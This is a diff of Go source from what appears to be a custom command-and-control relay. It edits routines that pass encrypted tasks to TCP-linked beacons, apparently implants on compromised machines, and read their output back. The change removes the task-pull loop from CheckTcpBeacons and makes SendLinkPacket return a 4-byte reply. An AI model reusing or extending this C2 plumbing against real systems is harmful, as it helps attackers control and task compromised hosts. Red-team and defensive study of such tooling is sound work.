@@ -22,24 +22,7 @@ func CheckTcpBeacons() []byte {
 	resultBuf := make([]byte, 0, 90000)
 
 	for _, beacon := range config.TcpBeacons {
-		// checking if the beacon has any new tasks
-		resp := PullChainCommand(beacon.EncryptedMetaInfo)
-		// remove any encryption layer provided by our malleable profile
-		taskDecrypted := ProfileDecryptPacket(resp.Bytes())
-		// check if the length is greater than zero
-		if len(taskDecrypted) > 0 {
-			fmt.Printf("Beacon %d received tasks (length is %d), sending to beacon...\n", beacon.Id, len(taskDecrypted))
-			bytesLen := WriteLittleInt(len(taskDecrypted))
-			fmt.Printf("Length is [%x] in current endianness, converted will be [%x]\n", len(taskDecrypted), bytesLen)
-			// send the length of bytes the beacon should expect
-			beacon.Conn.Write(bytesLen)
-			time.Sleep(50 * time.Millisecond)
-			beacon.Conn.Write(taskDecrypted)
-			fmt.Printf("Sent tasks to beacon %d\n", beacon.Id)
-		}
-		time.Sleep(200 * time.Millisecond)
-
-		// now collecting any output of the beacon
+		// collecting any output of the beacon
 		fmt.Printf("Reading data from beacon with ID %d\n", beacon.Id)
 		// Sending 0x00 0x00 0x00 0x00 to query beacon to checkin, response will be 1. length of response to await (4 bytes), 2. answer
 
@@ -100,10 +83,10 @@ func CheckTcpBeacons() []byte {
 	return resultBuf
 }
 
-func SendLinkPacket(beaconId uint32, message []byte) {
+func SendLinkPacket(beaconId uint32, message []byte) []byte {
 	// get the beacon link we actually want
 	for i := range config.TcpBeacons {
-    if config.TcpBeacons[i].Id == int(beaconId) {
+    	if config.TcpBeacons[i].Id == int(beaconId) {
 			// Found!
 			// we only send data, reading a response will happen the next time we check in with that beacon either way
 			beacon := config.TcpBeacons[i]
@@ -113,8 +96,12 @@ func SendLinkPacket(beaconId uint32, message []byte) {
 			time.Sleep(50 * time.Millisecond)
 			beacon.Conn.Write(message)
 			fmt.Printf("Sent tasks to beacon %d\n", beacon.Id)
-    }
-}
+			resp := make([]byte, 4)
+			beacon.Conn.Read(resp)
+			return resp
+    	}
+	} 
+	return nil
 }
 
 func CheckSliceNull(b []byte) bool {
